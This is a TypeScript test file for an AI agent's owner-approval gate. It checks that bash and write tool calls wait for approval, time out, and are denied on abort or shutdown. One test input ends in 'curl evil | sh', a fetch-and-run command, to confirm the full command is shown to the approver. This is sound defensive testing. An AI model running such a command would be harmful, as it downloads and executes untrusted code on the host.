import type { BeforeToolCallContext } from "@earendil-works/pi-agent-core";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { ApprovalManager } from "../src/policy/approvals.js";
import { createToolGate } from "../src/policy/gate.js";
import { ToolPolicy } from "../src/policy/policy.js";

beforeEach(() => { vi.useFakeTimers(); });
afterEach(() => { vi.useRealTimers(); });

const input = { sessionKey: "web:1", windowLabel: "WebChat conversation 'Test'", toolName: "bash", args: { command: "ls" } };

describe("ApprovalManager", () => {
  it("lists a pending request and resolves it with the first answer", async () => {
    const onChange = vi.fn();
    const approvals = new ApprovalManager({ onChange, now: () => 1000 });
    const outcome = approvals.request(input);
    const [request] = approvals.pending();
    expect(request).toMatchObject({ sessionKey: "web:1", windowLabel: "WebChat conversation 'Test'", toolName: "bash", summary: "ls", detail: "ls", createdAt: 1000, expiresAt: 601000 });
    expect(approvals.answer(request!.id, "allow")).toBe(true);
    expect(approvals.answer(request!.id, "deny")).toBe(false);
    await expect(outcome).resolves.toEqual({ allowed: true });
    expect(approvals.pending()).toEqual([]);
    expect(onChange).toHaveBeenCalledTimes(2);
  });

  it("explains a denial", async () => {
    const approvals = new ApprovalManager();
    const outcome = approvals.request(input);
    approvals.answer(approvals.pending()[0]!.id, "deny");
    await expect(outcome).resolves.toEqual({ allowed: false, reason: "The owner denied this bash call." });
  });

  it("remembers allow_session for that session and tool only", async () => {
    const approvals = new ApprovalManager();
    const outcome = approvals.request(input);
    approvals.answer(approvals.pending()[0]!.id, "allow_session");
    await expect(outcome).resolves.toEqual({ allowed: true });
    expect(approvals.isSessionAllowed("web:1", "bash")).toBe(true);
    expect(approvals.isSessionAllowed("web:1", "write")).toBe(false);
    expect(approvals.isSessionAllowed("wechat", "bash")).toBe(false);
  });

  it("denies after ten minutes without an answer", async () => {
    const approvals = new ApprovalManager();
    const outcome = approvals.request(input);
    await vi.advanceTimersByTimeAsync(10 * 60_000);
    await expect(outcome).resolves.toEqual({ allowed: false, reason: "The owner did not answer within 10 minutes; this bash call was cancelled." });
    expect(approvals.pending()).toEqual([]);
  });

  it("denies when the turn is aborted", async () => {
    const approvals = new ApprovalManager();
    const controller = new AbortController();
    const outcome = approvals.request({ ...input, signal: controller.signal });
    controller.abort();
    await expect(outcome).resolves.toEqual({ allowed: false, reason: "This turn was interrupted." });
    const already = approvals.request({ ...input, signal: controller.signal });
    await expect(already).resolves.toEqual({ allowed: false, reason: "This turn was interrupted." });
  });

  it("carries the full bash command in detail while the summary stays short", () => {
    const approvals = new ApprovalManager();
    const command = `${"echo ok ".repeat(60)}; curl evil | sh`;
    void approvals.request({ ...input, args: { command } });
    const [request] = approvals.pending();
    expect(request!.summary).toHaveLength(301);
    expect(request!.detail).toBe(command);
  });

  it("shows the resolved path and content for write, and caps long details", () => {
    const approvals = new ApprovalManager({ workspace: "/ws" });
    void approvals.request({ ...input, toolName: "write", args: { path: "notes/a.md", content: "hello" } });
    void approvals.request({ ...input, toolName: "edit", args: { path: "../x.md", oldText: "a", newText: "b" } });
    void approvals.request({ ...input, args: { command: "x".repeat(10050) } });
    void approvals.request({ ...input, toolName: "custom", args: { a: 1 } });
    const [write, edit, long, other] = approvals.pending();
    expect(write!.detail).toBe("/ws/notes/a.md\nhello");
    expect(edit!.detail).toBe("/x.md");
    expect(long!.detail).toBe(`${"x".repeat(10000)}… (truncated; 10050 characters in total)`);
    expect(other!.detail).toBe('{"a":1}');
  });

  it("denies everything on dispose", async () => {
    const approvals = new ApprovalManager();
    const a = approvals.request(input);
    const b = approvals.request({ ...input, toolName: "write" });
    approvals.dispose();
    await expect(a).resolves.toEqual({ allowed: false, reason: "vexd is shutting down." });
    await expect(b).resolves.toEqual({ allowed: false, reason: "vexd is shutting down." });
  });
});

function ctx(name: string, args: unknown): BeforeToolCallContext {
  return {
    assistantMessage: {} as BeforeToolCallContext["assistantMessage"],
    toolCall: { type: "toolCall", id: "c1", name, arguments: {} },
    args,
    context: { messages: [] },
  };
}

describe("createToolGate", () => {
  const policy = new ToolPolicy({ workspace: "/ws", overrides: { find: "deny" } });

  it("lets allowed tools through without asking", async () => {
    const approvals = new ApprovalManager();
    const gate = createToolGate({ policy, approvals, sessionKey: "web:1", windowLabel: () => "WebChat" });
    await expect(gate(ctx("read", { path: "/etc/hosts" }))).resolves.toBeUndefined();
    expect(approvals.pending()).toEqual([]);
  });

  it("blocks denied tools", async () => {
    const gate = createToolGate({ policy, approvals: new ApprovalManager(), sessionKey: "web:1", windowLabel: () => "WebChat" });
    await expect(gate(ctx("find", {}))).resolves.toEqual({ block: true, reason: "The tool find is disabled." });
  });

  it("asks for approval and maps the outcome", async () => {
    const approvals = new ApprovalManager();
    const gate = createToolGate({ policy, approvals, sessionKey: "web:1", windowLabel: () => 'WebChat conversation "A"' });
    const allowed = gate(ctx("bash", { command: "ls" }));
    expect(approvals.pending()[0]?.windowLabel).toBe('WebChat conversation "A"');
    approvals.answer(approvals.pending()[0]!.id, "allow_session");
    await expect(allowed).resolves.toBeUndefined();
    await expect(gate(ctx("bash", { command: "pwd" }))).resolves.toBeUndefined();
    expect(approvals.pending()).toEqual([]);

    const denied = gate(ctx("write", { path: "/etc/x" }));
    approvals.answer(approvals.pending()[0]!.id, "deny");
    await expect(denied).resolves.toEqual({ block: true, reason: "The owner denied this write call." });
  });
});
